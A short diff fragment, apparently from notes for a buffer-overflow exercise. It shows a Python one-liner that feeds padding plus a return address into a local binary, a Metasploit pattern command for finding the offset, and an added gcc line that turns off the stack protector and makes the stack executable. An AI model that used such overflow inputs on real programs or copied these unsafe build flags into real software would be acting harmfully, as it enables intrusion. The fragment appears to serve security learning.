@@ -123,3 +123,6 @@ python2.7 -c "print('A'*72 + '\x9d\x11\x00\x00\x00\x00\x00\x00')" | ./badcode.ex
 
 ./badcode.exe <<< $(msf-pattern_create -l 100)
 
+gcc -m32 -fno-stack-protector -z execstack -nopie -g -Wno-implicit-function-declaration bad.c -o badcode
+
+
